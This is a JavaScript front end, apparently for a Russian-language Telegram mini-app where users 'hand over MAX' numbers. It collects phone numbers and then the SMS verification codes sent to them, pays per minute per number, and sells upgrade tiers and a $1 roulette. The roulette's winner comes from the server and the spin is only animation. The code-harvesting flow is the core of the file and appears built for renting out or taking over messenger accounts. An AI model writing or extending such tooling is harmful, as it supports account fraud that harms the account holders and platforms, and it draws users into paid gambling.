// Helpers
const $ = sel => document.querySelector(sel);
function escapeHtml(s){return (s??"").replace(/[&<>"']/g,m=>({ "&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;" }[m]))}
function ripple(e){e.classList.add("rippling"); const r=e.getBoundingClientRect(); e.style.setProperty("--rx",(event.clientX-r.left)+"px"); e.style.setProperty("--ry",(event.clientY-r.top)+"px"); setTimeout(()=>e.classList.remove("rippling"),300)}
document.addEventListener("click",e=>{if(e.target.tagName==="BUTTON") ripple(e.target)})

// Telegram init
const tg = window.Telegram?.WebApp; tg && tg.expand();
const auth = tg?.initDataUnsafe?.user || {};
const user_id = auth.id || window.USER_ID || 0;
const username = auth.username || auth.first_name || "user";
const API_BASE = ""; // пусто = тот же хост, где запущен backend прокси/туннелем

// Notify (из предыдущей версии)
const Notify = (() => {
  const root = document.getElementById("notify-root");
  const modal = document.getElementById("notify-modal");
  const mTitle = document.getElementById("notify-title");
  const mCont  = document.getElementById("notify-content");
  const mClose = document.getElementById("notify-close");
  mClose.onclick = () => hideModal();

  function toast(msg, {title="", type="info", timeout=2500} = {}){
    const el = document.createElement("div");
    el.className = `notif ${type}`;
    el.innerHTML = `<div>${title ? `<div class="title">${escapeHtml(title)}</div>`:""}<div class="msg">${escapeHtml(msg)}</div></div><button class="x" aria-label="Закрыть">×</button>`;
    el.querySelector(".x").onclick = () => remove();
    root.appendChild(el);
    let t = setTimeout(remove, timeout);
    function remove(){ clearTimeout(t); if(el.parentNode) el.parentNode.removeChild(el); }
    return {close: remove};
  }
  function showModal({title="Сообщение", html="", onClose=null}={}){ mTitle.textContent=title; mCont.innerHTML=html; modal.classList.remove("hidden"); modal.setAttribute("aria-hidden","false"); mClose.onclick=()=>{hideModal(); onClose&&onClose();}; }
  function hideModal(){ modal.classList.add("hidden"); modal.setAttribute("aria-hidden","true"); }
  return { toast, info:(m,o)=>toast(m,{...o,type:"info"}), success:(m,o)=>toast(m,{...o,type:"success"}), error:(m,o)=>toast(m,{...o,type:"error"}), modal: showModal, close: hideModal };
})();

// HTTP
async function post(path, data){
  const res = await fetch((API_BASE||"")+"/api"+path, {
    method:"POST", headers:{ "Content-Type":"application/json" },
    body: JSON.stringify({ initData: tg?.initData, user_id, username, ...data })
  });
  return res.json();
}

// Навигация
function show(id){
  // скрыть ВСЕ карты, включая меню
  document.querySelectorAll(".card").forEach(el=>{
    el.classList.add("hidden");
    el.setAttribute("aria-hidden","true");
  });
  // показать нужный
  const el = (id==="menu") ? $("#menu") : $("#screen-"+id);
  if(!el) return;
  el.classList.remove("hidden");
  el.setAttribute("aria-hidden","false");

  if(id==="stats")   loadStats();
  if(id==="report")  loadReport();
  if(id==="roulette") setupRoulette();
  if(id==="priv")    loadPriv();
}
document.querySelectorAll('[data-screen]').forEach(b=>b.onclick=()=>show(b.dataset.screen));
document.querySelectorAll('.back').forEach(b=>b.onclick=()=>show("menu"));

// Логи
async function loadLogs(){
  const j = await post("/logs", {});
  const box = $("#chat"); box.innerHTML = "";
  (j.events||[]).forEach(e=>{
    const div = document.createElement("div");
    div.className = "bubble " + (e.role==="user"?"b-user":e.role==="admin"?"b-admin":"b-system");
    div.innerHTML = escapeHtml(e.text) + `<div class="meta">${escapeHtml(e.ts)}</div>`;
    box.appendChild(div);
  });
  box.scrollTop = box.scrollHeight;
}
$("#refreshLogs").onclick = loadLogs;

// Статистика
async function loadStats(){
  const j = await post("/stats",{});
  const s = j.stats||{};
  $("#statsBox").textContent =
`Пользователь: ${username}
ID: ${user_id}
Регистрация: ${s.first_seen||"—"}
Успешных номеров: ${s.success_count||0}
Неуспешных номеров: ${s.fail_count||0}
Всего заработано: ${Number(s.earned||0).toFixed(2)}
Баланс: ${Number(s.balance||0).toFixed(2)}
Рулетка: куплено $${Number(s.spent_roulette||0).toFixed(2)} • выигрыши $${Number(s.won_roulette||0).toFixed(2)}
`;
}

// Сдать MAX
let submission_id = 0;
$("#sendPhone").onclick = async () => {
  const phone = $("#phone").value.trim();
  if(!phone){ Notify.info("Введите номер"); $("#phone").focus(); return; }
  const j = await post("/submit_phone",{phone});
  if(j.ok){
    submission_id = j.submission_id;
    const p=$("#codePanel"); p.classList.remove("hidden"); p.setAttribute("aria-hidden","false");
    const ci=$("#code"); ci.value=""; ci.disabled=false; setTimeout(()=>ci.focus({preventScroll:true}),0);
    Notify.success("Номер отправлен. Введите код из SMS.");
    loadLogs();
  } else {
    Notify.error("Ошибка отправки номера");
  }
};
$("#sendCode").onclick = async () => {
  const ci=$("#code"); const code=ci.value.trim();
  if(!submission_id){ Notify.info("Сначала отправьте номер телефона"); return; }
  if(!code){ Notify.info("Введите код"); ci.focus(); return; }
  const j=await post("/submit_code",{submission_id,code});
  if(j.ok){
    Notify.success("Код отправлен. Ожидайте решения.");
    $("#phone").value=""; ci.value=""; $("#codePanel").classList.add("hidden"); $("#codePanel").setAttribute("aria-hidden","true");
    show("menu"); loadLogs();
  } else {
    Notify.error("Ошибка отправки кода");
  }
};

// Отчёт номеров
async function loadReport(){
  const j = await post("/my_numbers",{});
  const box = $("#reportList"); box.innerHTML="";
  (j.rows||[]).forEach(r=>{
    const div=document.createElement("div");
    div.className="bubble b-system";
    div.innerHTML = `#${r.id} • ${escapeHtml(r.phone)} • ${r.status} • ${r.minutes} мин • $${Number(r.earned).toFixed(2)}`;
    box.appendChild(div);
  });
}

// Рулетка (существующая логика предполагалась выше)
let ruReady=false, ruBusy=false;
function setupRoulette(){ if(ruReady) return; ruReady=true; }
function buildStrip(win, n=72){
  const arr=[]; for(let i=0;i<n;i++){ const v = (Math.random()<0.6? (Math.random()*0.6+0.1) : (Math.random()*0.9+0.6)).toFixed(2); arr.push(v); }
  arr[n-1]=Number(win).toFixed(2); return arr;
}
function renderStrip(vals){
  const strip=$("#case-strip"); strip.innerHTML="";
  vals.forEach(v=>{ const t=document.createElement("div"); t.className="case-tile"; t.innerHTML=`<div class="icon">$</div>$${v}`; strip.appendChild(t); });
  strip.style.transform="translateX(0)";
}
function animateToLast(done){
  const strip=$("#case-strip");
  const tiles=strip.children; const last=tiles[tiles.length-1];
  const totalWidth = Array.from(tiles).reduce((s,t)=>s+t.offsetWidth+10,0);
  const view = strip.parentElement.clientWidth;
  const target = -(totalWidth - view - 12);
  strip.animate([{transform:"translateX(0)"},{transform:`translateX(${target}px)`}],{duration:3400,easing:"cubic-bezier(.2,.9,.1,1)"})
       .onfinish=()=>{ strip.style.transform=`translateX(${target}px)`; done&&done(); };
}
document.getElementById("ru-spin").onclick = async ()=>{
  if(ruBusy) return; ruBusy=true; $("#ru-result").textContent="Покупка…";
  const res = await post("/roulette_spin",{});
  if(!res.ok){
    ruBusy=false;
    if(res.error==="NO_FUNDS") { Notify.error("Недостаточно средств: нужно $1"); loadLogs(); }
    else { Notify.error("Ошибка рулетки"); }
    return;
  }
  const strip = buildStrip(Number(res.win), 72);
  renderStrip(strip);
  $("#ru-result").textContent="Крутится…";
  animateToLast(()=>{
    $("#ru-result").textContent = `Выигрыш: $${Number(res.win).toFixed(2)} • Баланс: $${Number(res.balance).toFixed(2)}`;
    ruBusy=false; loadStats(); loadLogs();
    Notify.info(`Выигрыш: $${Number(res.win).toFixed(2)}`);
  });
};

// ===== Привилегии =====
async function loadPriv(){
  const r = await post("/priv/info",{});
  const p = r.plan||{};
  const rate = Number(r.rate||0).toFixed(2);
  $("#privSummary").textContent = `Тариф: ${p.plan||"standard"} • Ставка: $${rate}/мин • Действует до: ${p.plan_until||"—"}`;

  // Кнопки
  const active = (p.plan==="premium"||p.plan==="speed") && p.plan_until;
  $("#buy-premium").disabled = p.plan==="premium" && active;
  $("#buy-speed").disabled   = p.plan==="speed"   && active;

  const stdBtn = $("#std-activate");
  if(p.plan==="standard" || !active){
    stdBtn.textContent = "Активный"; stdBtn.disabled = true;
  } else {
    stdBtn.textContent = "Активировать"; stdBtn.disabled = false;
  }
}

$("#buy-premium").onclick = async ()=>{
  const res = await post("/priv/buy",{plan:"premium"});
  if(!res.ok){ return Notify.error(res.error==="NO_FUNDS"?"Недостаточно средств ($40)":"Ошибка покупки"); }
  Notify.success("Премиум активирован на 30 дней");
  loadStats(); loadPriv(); loadLogs();
};
$("#buy-speed").onclick = async ()=>{
  const res = await post("/priv/buy",{plan:"speed"});
  if(!res.ok){ return Notify.error(res.error==="NO_FUNDS"?"Недостаточно средств ($30)":"Ошибка покупки"); }
  Notify.success("Speed активирован на 30 дней");
  loadStats(); loadPriv(); loadLogs();
};
$("#std-activate").onclick = async ()=>{
  const res = await post("/priv/activate_standard",{});
  if(!res.ok){ return Notify.error("Ошибка активации"); }
  Notify.info(`Возврат: $${Number(res.refund||0).toFixed(2)}`);
  loadStats(); loadPriv(); loadLogs();
};

// Bootstrap
(async ()=>{ await post("/bootstrap",{}); loadStats(); loadLogs(); })();

